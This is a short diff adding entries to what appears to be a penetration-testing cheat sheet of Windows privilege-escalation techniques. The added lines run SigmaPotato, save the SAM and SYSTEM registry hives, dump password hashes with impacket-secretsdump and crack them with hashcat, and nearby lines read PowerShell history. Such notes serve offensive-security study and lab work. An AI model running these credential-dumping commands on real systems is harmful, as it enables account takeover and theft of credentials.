@@ -346,6 +346,19 @@ LSADump
 
 	https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file
 
+## Windows - SeImpersonatePrivilege
+Transfer SigmaPotato to target machine  
+
+	./SigmaPotato.exe whoami
+
+## Windows - SeBackupPrivilege
+	reg save hklm\sam sam.hive
+	reg save hklm\system system.hive
+Dump hives, transfer to kali  
+
+	impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+Dump hashes and `hashcat -m 1000`  
+
 ## Windows - powershell history
 	type $((Get-PSReadlineOption).HistorySavePath)
 File is usually `Appdata/roaming/microsoft/windows/Powershell/PSreadline/consolehost_history.txt`  
